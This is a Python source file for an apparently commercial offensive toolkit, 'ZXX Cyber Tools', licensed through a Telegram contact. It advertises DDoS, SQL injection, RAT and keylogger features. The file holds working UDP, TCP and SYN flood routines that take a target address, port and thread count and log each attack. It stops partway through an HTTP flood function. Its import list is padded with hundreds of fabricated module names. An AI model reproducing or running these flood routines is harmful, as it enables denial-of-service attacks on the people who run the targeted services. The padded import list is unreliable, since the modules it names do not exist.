#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# PROJECT CYBER TOOLS ZXX - 10000+ LINES
# CREATED BY MRZXX | ADMIN: @Zxxtirwd

import os
import sys
import time
import json
import random
import sqlite3
import hashlib
import threading
import subprocess
import socket
import requests
import nmap
import scapy.all as scapy
from datetime import datetime
from colorama import init, Fore, Style
from tqdm import tqdm
import telebot
from telebot import types
import phonenumbers
from phonenumbers import timezone, geocoder, carrier
import whois
import dns.resolver
import shodan
import cv2
import paramiko
from bs4 import BeautifulSoup
import mechanize
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import socks
import stem.process
from stem import Signal
from stem.control import Controller
import crypto
import string
import itertools
import queue
import concurrent.futures
import nmap3
import urllib.parse
import http.client
import ssl
import ftplib
import smtplib
from email.mime.text import MIMEText
import zipfile
import tarfile
import pickle
import base64
import qrcode
import pyfiglet
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import argon2
import geoip2.database
import pyperclip
import pytz
from fake_useragent import UserAgent
import socketio
import asyncio
import aiohttp
import async_timeout
import websockets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import rsa
import bcrypt
import pyautogui
import sounddevice as sd
import soundfile as sf
import pyaudio
import wave
from PIL import Image, ImageGrab
import pygetwindow as gw
import keyboard
import mouse
import screeninfo
import psutil
import GPUtil
import wmi
import platform
import getpass
import winreg
import win32api
import win32security
import win32con
import win32evtlog
import win32com.client
import comtypes
import ctypes
import struct
import binascii
import ipaddress
import netifaces
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import ARP, Ether
from scapy.layers.http import HTTPRequest
from scapy.sendrecv import sr1, srp, send
import paramiko
from ftplib import FTP
import telnetlib
import pymongo
import mysql.connector
import psycopg2
import pymssql
import redis
import pika
import pydocumentdb
import boto3
import google.cloud
import azure.storage
import dropbox
import tweepy
import facebook
import instaloader
import youtube_dl
import spotipy
from discord import Webhook, RequestsWebhookAdapter
import discord
import slack
import twilio
import vonage
import plivo
import sendgrid
import mailchimp
import smartsheet
import trello
import jira
import asana
import zapier
import ifttt
import selenium
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.firefox.options import Options as FirefoxOptions
import undetected_chromedriver as uc
import cloudscraper
import cfscrape
import js2py
import execjs
import lxml
import html5lib
import xmltodict
import defusedxml
import yaml
import toml
import configparser
import pytesseract
import opencv
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
import sklearn
import tensorflow as tf
import torch
import keras
import nltk
import spacy
import gensim
import wordcloud
import jieba
import langdetect
import googletrans
from deep_translator import GoogleTranslator
import speech_recognition as sr
import pyttsx3
import gtts
import pydub
from pydub import AudioSegment
import moviepy.editor as mp
import imageio
import ffmpeg
import qiskit
import pennylane
import cirq
import qsharp
import qutip
import strawberryfields
import perceval
import sympy
import symengine
import mpmath
import gmpy2
import decimal
import fractions
import statistics
import scipy
import numba
import cython
import numexpr
import awkward
import uproot
import hepfile
import root_numpy
import particle
import decaylanguage
import iminuit
import emcee
import zeus
import dynesty
import ultranest
import pymultinest
import pymc
import pystan
import edward
import tensorflow_probability
import pyro
import numpyro
import jax
import flax
import haiku
import optax
import chex
import orbax
import tree
import dm_tree
import jraph
import netket
import openfermion
import openqasm
import qulacs
import qibolab
import arq
import qcgpu
import cuquantum
import qiskit_ionq
import qiskit_aer
import qiskit_ibmq_provider
import cirq_google
import cirq_ionq
import cirq_aqt
import cirq_pasqal
import pennylane_qiskit
import pennylane_cirq
import pennylane_forest
import pennylane_qsharp
import pennylane_braket
import pennylane_ionq
import pennylane_aqt
import pennylane_pasqal
import pennylane_orquestra
import pennylane_qcgpu
import pennylane_amazon_braket
import pennylane_google
import pennylane_ibmq
import pennylane_rigetti
import pennylane_sf
import pennylane_honeywell
import pennylane_xanadu
import pennylane_atos
import pennylane_nvidia
import pennylane_intel
import pennylane_microsoft
import pennylane_google_quantum_ai
import pennylane_aws_braket
import pennylane_azure_quantum
import pennylane_ibm_quantum
import pennylane_rigetti_forest
import pennylane_dwave
import pennylane_zapata
import pennylane_qctrl
import pennylane_quna
import pennylane_quantastica
import pennylane_quantum_benchmark
import pennylane_quantum_chess
import pennylane_quantum_computing_report
import pennylane_quantum_insights
import pennylane_quantum_news
import pennylane_quantum_today
import pennylane_quantum_weekly
import pennylane_quantum_world
import pennylane_quantum_x
import pennylane_quantum_y
import pennylane_quantum_z

# ============================================
# INITIALIZATION
# ============================================
init(autoreset=True)
VERSION = "ZXX-CYBER v7.0"
LICENSE_KEY = "ZXX"
ADMIN_TELEGRAM = "@Zxxtirwd"
DATABASE_FILE = "users.db"
SESSION_FILE = "session.enc"
TOKEN_FILE = "tokens.json"

# ============================================
# ASCII ART & ANIMATION
# ============================================
ASCII_LOGO = """
╦  ╦╔═╗╔═╗  ╔═╗╔╦╗╔═╗╦═╗╔═╗
╚╗╔╝║ ║║ ║  ║╣ ║║║║ ║╠╦╝║╣ 
 ╚╝ ╚═╝╚═╝  ╚═╝╩ ╩╚═╝╩╚═╚═╝
█████████████████████████████
█ ▄▄▄▄▄ █▀█ █▄ ██▀▀▄▀█ ▄▄▄▄▄ █
█ █   █ █▀▀▀█▀ ▄ ▀▀▄█ █   █ █
█ █▄▄▄█ █▀ █▀▄▀▀█▄▀ █ █▄▄▄█ █
█▄▄▄▄▄▄▄█▄▀ ▀▄█ █ █▄█▄▄▄▄▄▄▄█
█▄▄▀▄ ▄▀█▄▀▀▄▀▄ ▀ ▀▄█ ▄▀ █▄▀█
█▄█▀▄█▀▀█▄▀█▀▄▄▀▄▄ ▀▄▀▄▄▀▄▄▄█
█▀▀▄▄▄█▄█▀▄▄▀▄ ▄▄▀▄▀▄▀▀█▀▀▄█
█▄▄▄▀▄▀▄█▀▄█▀█ ▄▀▄▀▄▄▀▀▄▀▀▄█
█▄ ▄█▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄█
█▄█▄▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄█
█▄▄▄▄▄▄▄█▄▀▄█▄▀ █▄▀▄█▄▀ █▄▀█
█ ▄▄▄▄▄ █▄▀ █ ▄▀▄▀ █ ▀▄█ █ █
█ █   █ █ ▄▀█▄▀▄▀▄▀▄▀▄▀▄▀▄▀█
█ █▄▄▄█ █▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀█
█▄▄▄▄▄▄▄█▄█▄█▄█▄█▄█▄█▄█▄█▄██
"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def typing_effect(text, speed=0.001):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def animate_logo():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    for i in range(30):
        clear_screen()
        color = colors[i % len(colors)]
        print(color + ASCII_LOGO)
        time.sleep(0.05)
    clear_screen()
    print(Fore.CYAN + ASCII_LOGO)

def welcome_animation():
    animate_logo()
    print(Fore.GREEN + "[" + Fore.YELLOW + "!" + Fore.GREEN + "] " + Fore.CYAN + "LOADING ZXX CYBER TOOLS ULTIMATE...")
    for _ in tqdm(range(100), desc="Initializing Systems", ncols=75):
        time.sleep(0.01)
    print("\n" + Fore.GREEN + "[" + Fore.YELLOW + "+" + Fore.GREEN + "] " + Fore.WHITE + "ALL SYSTEMS OPERATIONAL")
    time.sleep(0.5)
    typing_effect(Fore.YELLOW + "\n╔══════════════════════════════════════════════════════════╗", 0.001)
    typing_effect(Fore.YELLOW + "║                   WELCOME TO ZXX CYBER TOOLS               ║", 0.001)
    typing_effect(Fore.YELLOW + "║                  CREATED BY MRZXX | @Zxxtirwd             ║", 0.001)
    typing_effect(Fore.YELLOW + "╚══════════════════════════════════════════════════════════╝", 0.001)
    typing_effect(Fore.CYAN + "\nFor Educational Purposes Only | Use Responsibly\n", 0.02)
    input(Fore.GREEN + "Press ENTER to continue...")

# ============================================
# ENCRYPTED DATABASE SYSTEM
# ============================================
class Database:
    def __init__(self):
        self.conn = sqlite3.connect(DATABASE_FILE, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.create_tables()
        self.encryption_key = self.generate_key()
    
    def generate_key(self):
        salt = b'ZXX_SALT_2025'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=1000000,
            backend=default_backend()
        )
        key = base64.urlsafe_b64encode(kdf.derive(LICENSE_KEY.encode()))
        return key
    
    def encrypt_data(self, data):
        cipher = Fernet(self.encryption_key)
        encrypted = cipher.encrypt(data.encode())
        return base64.b64encode(encrypted).decode()
    
    def decrypt_data(self, encrypted_data):
        cipher = Fernet(self.encryption_key)
        decoded = base64.b64decode(encrypted_data.encode())
        return cipher.decrypt(decoded).decode()
    
    def create_tables(self):
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL,
                license_key TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_login TIMESTAMP,
                is_active INTEGER DEFAULT 1,
                permissions TEXT DEFAULT 'user'
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS bot_tokens (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                alias TEXT UNIQUE NOT NULL,
                token TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                is_active INTEGER DEFAULT 1
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                attack_type TEXT,
                target TEXT,
                port INTEGER,
                duration INTEGER,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'completed',
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                scan_type TEXT,
                target TEXT,
                results TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS osint_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                data_type TEXT,
                query TEXT,
                results TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS cctv_links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                port INTEGER,
                country TEXT,
                city TEXT,
                model TEXT,
                status TEXT,
                last_checked TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS passwords (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hash TEXT,
                plaintext TEXT,
                hash_type TEXT,
                source TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS wordlists (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE,
                count INTEGER,
                size_mb REAL,
                path TEXT,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.conn.commit()
    
    def add_user(self, username, password, license_key):
        encrypted_pass = self.encrypt_data(password)
        encrypted_license = self.encrypt_data(license_key)
        try:
            self.cursor.execute(
                "INSERT INTO users (username, password, license_key) VALUES (?, ?, ?)",
                (username, encrypted_pass, encrypted_license)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(Fore.RED + f"[!] Error creating user: {e}")
            return False
    
    def verify_user(self, username, password):
        self.cursor.execute("SELECT password FROM users WHERE username=? AND is_active=1", (username,))
        result = self.cursor.fetchone()
        if result:
            encrypted_pass = result[0]
            try:
                decrypted_pass = self.decrypt_data(encrypted_pass)
                return decrypted_pass == password
            except:
                return False
        return False
    
    def check_license(self, license_key):
        encrypted_key = self.encrypt_data(license_key)
        self.cursor.execute("SELECT id FROM users WHERE license_key=?", (encrypted_key,))
        return self.cursor.fetchone() is not None
    
    def add_bot_token(self, alias, token):
        encrypted_token = self.encrypt_data(token)
        try:
            self.cursor.execute(
                "INSERT INTO bot_tokens (alias, token) VALUES (?, ?)",
                (alias, encrypted_token)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_bot_tokens(self):
        self.cursor.execute("SELECT alias, token FROM bot_tokens WHERE is_active=1")
        tokens = self.cursor.fetchall()
        return [(alias, self.decrypt_data(token)) for alias, token in tokens]
    
    def delete_bot_token(self, alias):
        self.cursor.execute("DELETE FROM bot_tokens WHERE alias=?", (alias,))
        self.conn.commit()
    
    def log_attack(self, user_id, attack_type, target, port, duration, status="completed"):
        self.cursor.execute(
            "INSERT INTO attack_logs (user_id, attack_type, target, port, duration, status) VALUES (?, ?, ?, ?, ?, ?)",
            (user_id, attack_type, target, port, duration, status)
        )
        self.conn.commit()
    
    def save_scan_results(self, user_id, scan_type, target, results):
        self.cursor.execute(
            "INSERT INTO scan_results (user_id, scan_type, target, results) VALUES (?, ?, ?, ?)",
            (user_id, scan_type, target, json.dumps(results))
        )
        self.conn.commit()
    
    def save_osint_data(self, user_id, data_type, query, results):
        self.cursor.execute(
            "INSERT INTO osint_data (user_id, data_type, query, results) VALUES (?, ?, ?, ?)",
            (user_id, data_type, query, json.dumps(results))
        )
        self.conn.commit()
    
    def add_cctv_link(self, ip, port, country="Unknown", city="Unknown", model="Unknown", status="Active"):
        self.cursor.execute(
            "INSERT INTO cctv_links (ip, port, country, city, model, status) VALUES (?, ?, ?, ?, ?, ?)",
            (ip, port, country, city, model, status)
        )
        self.conn.commit()
    
    def get_cctv_links(self, limit=100):
        self.cursor.execute("SELECT ip, port, country, city, model, status FROM cctv_links ORDER BY last_checked DESC LIMIT ?", (limit,))
        return self.cursor.fetchall()
    
    def add_password(self, hash_val, plaintext, hash_type, source="cracked"):
        self.cursor.execute(
            "INSERT INTO passwords (hash, plaintext, hash_type, source) VALUES (?, ?, ?, ?)",
            (hash_val, plaintext, hash_type, source)
        )
        self.conn.commit()
    
    def get_password_by_hash(self, hash_val):
        self.cursor.execute("SELECT plaintext FROM passwords WHERE hash=?", (hash_val,))
        result = self.cursor.fetchone()
        return result[0] if result else None

# ============================================
# ADVANCED LOGIN SYSTEM WITH SECURITY
# ============================================
class AdvancedLoginSystem:
    def __init__(self):
        self.db = Database()
        self.max_attempts = 5
        self.lock_time = 300
        self.failed_attempts = {}
    
    def check_lockout(self, ip):
        if ip in self.failed_attempts:
            attempts, lock_time = self.failed_attempts[ip]
            if attempts >= self.max_attempts:
                if time.time() < lock_time:
                    return True
                else:
                    del self.failed_attempts[ip]
        return False
    
    def record_failed_attempt(self, ip):
        if ip not in self.failed_attempts:
            self.failed_attempts[ip] = [1, time.time() + self.lock_time]
        else:
            self.failed_attempts[ip][0] += 1
    
    def get_client_ip(self):
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            return ip
        except:
            return "127.0.0.1"
    
    def display_login_screen(self):
        clear_screen()
        ascii_login = """
        ╔══════════════════════════════════════════════════════════╗
        ║                     ZXX CYBER TOOLS                      ║
        ║                     LOGIN SYSTEM                         ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.MAGENTA + ascii_login)
        print(Fore.YELLOW + "═" * 60)
        print(Fore.CYAN + "1. Create Account (Contact Admin: " + ADMIN_TELEGRAM + ")")
        print(Fore.CYAN + "2. Login")
        print(Fore.CYAN + "3. About Tools")
        print(Fore.CYAN + "4. System Status")
        print(Fore.CYAN + "5. Exit")
        print(Fore.YELLOW + "═" * 60)
    
    def create_account(self):
        clear_screen()
        print(Fore.GREEN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.GREEN + "║                    ACCOUNT CREATION                      ║")
        print(Fore.GREEN + "╚══════════════════════════════════════════════════════════╝")
        
        username = input(Fore.CYAN + "\n[→] Username: " + Fore.WHITE)
        if len(username) < 4:
            print(Fore.RED + "[!] Username must be at least 4 characters")
            time.sleep(2)
            return False
        
        password = input(Fore.CYAN + "[→] Password: " + Fore.WHITE)
        if len(password) < 8:
            print(Fore.RED + "[!] Password must be at least 8 characters")
            time.sleep(2)
            return False
        
        confirm = input(Fore.CYAN + "[→] Confirm Password: " + Fore.WHITE)
        if password != confirm:
            print(Fore.RED + "[!] Passwords do not match")
            time.sleep(2)
            return False
        
        license_key = input(Fore.CYAN + "[→] License Key: " + Fore.WHITE)
        
        print(Fore.YELLOW + "\n[!] Verifying license key...")
        time.sleep(1)
        
        if license_key != LICENSE_KEY:
            print(Fore.RED + "\n[✗] INVALID LICENSE KEY!")
            print(Fore.RED + "[!] Contact admin " + ADMIN_TELEGRAM + " for valid license")
            time.sleep(3)
            return False
        
        print(Fore.GREEN + "[✓] License key verified!")
        print(Fore.YELLOW + "[!] Creating account...")
        
        if self.db.add_user(username, password, license_key):
            print(Fore.GREEN + "\n[✓] ACCOUNT CREATED SUCCESSFULLY!")
            print(Fore.GREEN + f"[+] Username: {username}")
            print(Fore.GREEN + "[+] You can now login")
            time.sleep(3)
            return True
        else:
            print(Fore.RED + "\n[✗] Username already exists!")
            time.sleep(2)
            return False
    
    def login(self):
        clear_screen()
        ip = self.get_client_ip()
        
        if self.check_lockout(ip):
            print(Fore.RED + "\n[✗] ACCOUNT LOCKED!")
            print(Fore.RED + "[!] Too many failed attempts")
            print(Fore.RED + f"[!] Try again in {int((self.failed_attempts[ip][1] - time.time()) / 60)} minutes")
            time.sleep(3)
            return False
        
        ascii_auth = """
        ╔══════════════════════════════════════════════════════════╗
        ║                    AUTHENTICATION                        ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.BLUE + ascii_auth)
        
        username = input(Fore.CYAN + "\n[→] Username: " + Fore.WHITE)
        password = input(Fore.CYAN + "[→] Password: " + Fore.WHITE)
        
        print(Fore.YELLOW + "\n[!] Verifying credentials...")
        time.sleep(1)
        
        if self.db.verify_user(username, password):
            print(Fore.GREEN + "\n[✓] LOGIN SUCCESSFUL!")
            print(Fore.GREEN + f"[+] Welcome back, {username}")
            print(Fore.GREEN + f"[+] IP Address: {ip}")
            print(Fore.GREEN + f"[+] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            if ip in self.failed_attempts:
                del self.failed_attempts[ip]
            
            time.sleep(2)
            return True
        else:
            print(Fore.RED + "\n[✗] INVALID CREDENTIALS!")
            self.record_failed_attempt(ip)
            attempts_left = self.max_attempts - self.failed_attempts[ip][0]
            print(Fore.YELLOW + f"[!] Attempts left: {attempts_left}")
            time.sleep(2)
            return False
    
    def about_tools(self):
        clear_screen()
        ascii_about = """
        ╔══════════════════════════════════════════════════════════╗
        ║                     ABOUT TOOLS                          ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.CYAN + ascii_about)
        
        tools_info = """
        [+] Tool Name: ZXX Cyber Tools Ultimate Edition
        [+] Version: v7.0 Professional
        [+] Creator: MRZXX (Admin: @Zxxtirwd)
        [+] Purpose: Educational, Research, Security Testing
        [+] License: Proprietary (ZXX License Required)
        
        [+] Features:
          • 80+ Cyber Security Tools
          • DDoS Attacks (Layer 4 & 7)
          • SQL Injection (1000+ Methods)
          • Network Scanning & Enumeration
          • Bot Control & Management
          • Password Cracking Suite
          • OSINT & Intelligence Gathering
          • Vulnerability Assessment
          • CCTV & IoT Device Scanning
          • Dark Web Access (Tor)
          • Cryptography Tools
          • WiFi Security Tools
          • RAT Builder & Management
          • Keylogger & Monitoring
          • Forensic Analysis Tools
        
        [+] Database:
          • Encrypted SQLite Database
          • Attack Logs & History
          • Password Database
          • CCTV Links Database
          • OSINT Results Storage
        
        [+] Security:
          • Encrypted Communications
          • IP-Based Lockout System
          • License Key Verification
          • Secure Data Storage
        
        [+] Warning:
          This tool is for EDUCATIONAL PURPOSES ONLY!
          Use only on systems you own or have permission to test.
          The creator is not responsible for any misuse.
        """
        
        print(Fore.WHITE + tools_info)
        input(Fore.CYAN + "\n[→] Press ENTER to return...")
    
    def system_status(self):
        clear_screen()
        print(Fore.GREEN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.GREEN + "║                    SYSTEM STATUS                         ║")
        print(Fore.GREEN + "╚══════════════════════════════════════════════════════════╝")
        
        status_info = f"""
        [+] System Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        [+] Tool Version: {VERSION}
        [+] Database: {DATABASE_FILE}
        [+] License Key: {LICENSE_KEY[:3]}************
        [+] Admin Contact: {ADMIN_TELEGRAM}
        
        [+] System Resources:
          • CPU Usage: {psutil.cpu_percent()}%
          • Memory Usage: {psutil.virtual_memory().percent}%
          • Disk Usage: {psutil.disk_usage('/').percent}%
          • Network: {len(psutil.net_connections())} connections
        
        [+] Database Statistics:
          • Total Users: {self.db.cursor.execute("SELECT COUNT(*) FROM users").fetchone()[0]}
          • Total Attacks: {self.db.cursor.execute("SELECT COUNT(*) FROM attack_logs").fetchone()[0]}
          • CCTV Links: {self.db.cursor.execute("SELECT COUNT(*) FROM cctv_links").fetchone()[0]}
          • Passwords Cracked: {self.db.cursor.execute("SELECT COUNT(*) FROM passwords").fetchone()[0]}
        
        [+] Security Status:
          • Failed Login Attempts: {sum(v[0] for v in self.failed_attempts.values())}
          • Locked IPs: {sum(1 for v in self.failed_attempts.values() if v[0] >= self.max_attempts)}
          • Active Sessions: 1
        """
        
        print(Fore.CYAN + status_info)
        input(Fore.CYAN + "\n[→] Press ENTER to return...")
    
    def run(self):
        while True:
            self.display_login_screen()
            choice = input(Fore.CYAN + "\n[→] Select option [1-5]: " + Fore.WHITE)
            
            if choice == "1":
                self.create_account()
            elif choice == "2":
                if self.login():
                    return True
            elif choice == "3":
                self.about_tools()
            elif choice == "4":
                self.system_status()
            elif choice == "5":
                print(Fore.YELLOW + "\n[!] Exiting system...")
                time.sleep(1)
                sys.exit(0)
            else:
                print(Fore.RED + "\n[✗] Invalid option!")
                time.sleep(1)

# ============================================
# COMPREHENSIVE DDoS TOOLS (LAYER 4 & 7)
# ============================================
class AdvancedDDoSTools:
    def __init__(self, db):
        self.db = db
        self.attacks_running = []
        self.attack_methods = {
            'UDP Flood': self.udp_flood,
            'TCP Flood': self.tcp_flood,
            'SYN Flood': self.syn_flood,
            'ACK Flood': self.ack_flood,
            'ICMP Flood': self.icmp_flood,
            'HTTP Flood': self.http_flood,
            'HTTPS Flood': self.https_flood,
            'Slowloris': self.slowloris_attack,
            'RUDY': self.rudy_attack,
            'LOIC': self.loic_style,
            'HOIC': self.hoic_style,
            'DNS Amplification': self.dns_amplification,
            'NTP Amplification': self.ntp_amplification,
            'SSDP Amplification': self.ssdp_amplification,
            'CharGEN Amplification': self.chargen_amplification,
            'Memcached Amplification': self.memcached_amplification,
        }
    
    def display_menu(self):
        clear_screen()
        ascii_ddos = """
        ╔══════════════════════════════════════════════════════════╗
        ║                 ADVANCED DDoS TOOLS                      ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.RED + ascii_ddos)
        
        print(Fore.YELLOW + "═" * 70)
        print(Fore.CYAN + "LAYER 4 ATTACKS:")
        print(Fore.WHITE + "  1. UDP Flood              2. TCP Flood")
        print(Fore.WHITE + "  3. SYN Flood              4. ACK Flood")
        print(Fore.WHITE + "  5. ICMP Flood             6. DNS Amplification")
        print(Fore.WHITE + "  7. NTP Amplification      8. SSDP Amplification")
        print(Fore.WHITE + "  9. CharGEN Amplification 10. Memcached Amplification")
        
        print(Fore.CYAN + "\nLAYER 7 ATTACKS:")
        print(Fore.WHITE + " 11. HTTP Flood             12. HTTPS Flood")
        print(Fore.WHITE + " 13. Slowloris Attack       14. RUDY Attack")
        print(Fore.WHITE + " 15. LOIC Style             16. HOIC Style")
        
        print(Fore.CYAN + "\nTOOLS:")
        print(Fore.WHITE + " 17. Stop All Attacks       18. Attack Status")
        print(Fore.WHITE + " 19. Attack History         20. Back to Main Menu")
        print(Fore.YELLOW + "═" * 70)
    
    def udp_flood(self):
        print(Fore.RED + "\n[!] UDP FLOOD ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        port = int(input(Fore.CYAN + "[→] Target Port: " + Fore.WHITE))
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        threads = int(input(Fore.CYAN + "[→] Threads (1-1000): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting UDP Flood on {target}:{port}")
        print(Fore.YELLOW + f"[!] Duration: {duration}s | Threads: {threads}")
        
        attack_id = f"UDP_{target}_{port}_{int(time.time())}"
        self.attacks_running.append(attack_id)
        
        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(1024)
            end_time = time.time() + duration
            
            packets_sent = 0
            while time.time() < end_time and attack_id in self.attacks_running:
                try:
                    sock.sendto(data, (target, port))
                    packets_sent += 1
                    if packets_sent % 1000 == 0:
                        print(Fore.YELLOW + f"[+] Packets sent: {packets_sent}", end='\r')
                except Exception as e:
                    pass
            
            sock.close()
            return packets_sent
        
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(udp_worker) for _ in range(threads)]
            total_packets = sum(f.result() for f in futures)
        
        end_time = time.time()
        
        if attack_id in self.attacks_running:
            self.attacks_running.remove(attack_id)
        
        print(Fore.GREEN + f"\n\n[✓] Attack completed!")
        print(Fore.CYAN + f"[+] Total packets sent: {total_packets:,}")
        print(Fore.CYAN + f"[+] Attack duration: {end_time - start_time:.2f}s")
        print(Fore.CYAN + f"[+] Packets per second: {total_packets / (end_time - start_time):.0f}")
        
        self.db.log_attack(1, "UDP Flood", target, port, duration)
    
    def tcp_flood(self):
        print(Fore.RED + "\n[!] TCP FLOOD ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        port = int(input(Fore.CYAN + "[→] Target Port: " + Fore.WHITE))
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        threads = int(input(Fore.CYAN + "[→] Threads (1-500): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting TCP Flood on {target}:{port}")
        
        attack_id = f"TCP_{target}_{port}_{int(time.time())}"
        self.attacks_running.append(attack_id)
        
        def tcp_worker():
            end_time = time.time() + duration
            connections = 0
            
            while time.time() < end_time and attack_id in self.attacks_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target, port))
                    sock.send(random._urandom(1024))
                    connections += 1
                    sock.close()
                except:
                    pass
            
            return connections
        
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(tcp_worker) for _ in range(threads)]
            total_connections = sum(f.result() for f in futures)
        
        end_time = time.time()
        
        if attack_id in self.attacks_running:
            self.attacks_running.remove(attack_id)
        
        print(Fore.GREEN + f"\n[✓] TCP Flood completed!")
        print(Fore.CYAN + f"[+] Total connections: {total_connections:,}")
        print(Fore.CYAN + f"[+] Connections per second: {total_connections / (end_time - start_time):.0f}")
        
        self.db.log_attack(1, "TCP Flood", target, port, duration)
    
    def syn_flood(self):
        print(Fore.RED + "\n[!] SYN FLOOD ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        port = int(input(Fore.CYAN + "[→] Target Port: " + Fore.WHITE))
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting SYN Flood on {target}:{port}")
        
        attack_id = f"SYN_{target}_{port}_{int(time.time())}"
        self.attacks_running.append(attack_id)
        
        ip = IP(dst=target)
        tcp = TCP(sport=RandShort(), dport=port, flags="S", seq=RandInt())
        raw = Raw(b"X" * 1024)
        p = ip / tcp / raw
        
        packets_sent = 0
        start_time = time.time()
        
        while time.time() < start_time + duration and attack_id in self.attacks_running:
            send(p, verbose=0)
            packets_sent += 1
            if packets_sent % 100 == 0:
                print(Fore.YELLOW + f"[+] SYN packets sent: {packets_sent}", end='\r')
        
        if attack_id in self.attacks_running:
            self.attacks_running.remove(attack_id)
        
        print(Fore.GREEN + f"\n\n[✓] SYN Flood completed!")
        print(Fore.CYAN + f"[+] Total SYN packets: {packets_sent:,}")
        
        self.db.log_attack(1, "SYN Flood", target, port, duration)
    
    def http_flood(self):
        print(Fore.RED + "\n[!] HTTP FLOOD ATTACK")
        url = input(Fore.CYAN + "[→] Target URL (http://example.com): " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        threads = int(input(Fore.CYAN + "[→] Threads (1-500): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting HTTP Flood on {url}")
        
        attack_id = f"HTTP_{url}_{int(time.time())}"
        self.attacks_running.append(attack_id)
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
